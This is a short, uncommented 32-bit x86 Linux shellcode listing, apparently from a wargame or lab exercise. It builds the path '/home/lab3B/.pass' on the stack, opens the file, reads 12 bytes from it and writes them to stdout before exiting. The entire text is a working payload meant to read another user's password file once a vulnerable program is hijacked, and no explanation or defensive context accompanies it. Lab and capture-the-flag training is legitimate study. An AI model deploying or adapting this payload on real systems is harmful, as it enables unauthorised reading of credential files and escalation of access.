xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
push 0x73736170
push 0x2E2F4233
push 0x62616C2F
push 0x656D6F68
push 0x2F424242
add esp, 3
mov ebx, esp
mov BYTE [ebx+0x11], 0x0
mov al, 5
mov dl, 4
int 0x80
xor edx, edx
xchg eax, ebx
xchg eax, ecx
mov al, 3
mov dl, 0xc
int 0x80
xor eax, eax
xor ebx, ebx
mov bl, 1
mov al, 4
int 0x80
xor eax, eax
xor ebx, ebx
mov al, 1
int 0x80
